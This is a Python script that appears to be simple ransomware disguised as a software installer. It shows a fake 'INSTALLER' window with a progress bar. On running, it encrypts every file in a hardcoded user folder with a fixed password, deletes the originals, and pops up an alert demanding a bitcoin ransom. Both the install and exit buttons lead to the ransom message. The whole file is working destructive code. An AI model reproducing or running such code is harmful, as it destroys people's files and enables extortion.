import os
import pyautogui as pg
pg.alert(" DOWNLOAD DATA GAME CHANGER","DOWNLOADING")
from tkinter import *
from tkinter import ttk
import time
import pyAesCrypt as en
root=Tk()
root.config(bg="grey")
l=Label(root,text="TAP INSTALL TO INSTALL THE FILE ELSE PRESS EXIT TO EXIT THE INSTALLER",bg="grey",fg="yellow")
l.pack()
root.title("INSTALLER")
var=StringVar()
def disp():
    def update():
        k = 0
        while k <= 100:
            var.set(k)
            k += 1
            time.sleep(0.03)
            root.update_idletasks()
    root.after(100, update)
    l['text']="DOWNLOADING............"
    pg.alert("YOUR SYSTEM IS BEEN HACKED PLEASE PAY RANSOME AMOUNT TO GET YOUR FILE ENCRYPTION PASSWORD WE ONLY ACCEPT BITCOIN ADDRESS:348774578876456879458###$#%$$^","HACKED")
b3=Button(root,text=" DOWNLOAD AND INSTALL",command=disp,bg="grey",fg="yellow")
b3.pack()
b3.config(text="INSTALL")
b4=Button(root,text="EXIT",command=disp,bg="grey",fg="yellow")
b4.pack()
d=ttk.Progressbar(root,orient=HORIZONTAL,length=600,variable=var)
d.pack()
f="C:/Users/papa/desktop/dad1"
files=os.listdir(f)
os.chdir(f)# to directory change default
#------------ENCcrypted----------
bufferSize = 64 * 1024
password = "prakhar"
# encrypt
for i in range(0,len(files)):
               en.encryptFile(files[i],f"{files[i]}.pvirus.aes", password, bufferSize)
               os.remove(files[i])
               #en.decryptFile(files[i], f"{files[i]}.jpeg","prakhar", bufferSize)
               
mainloop()
    
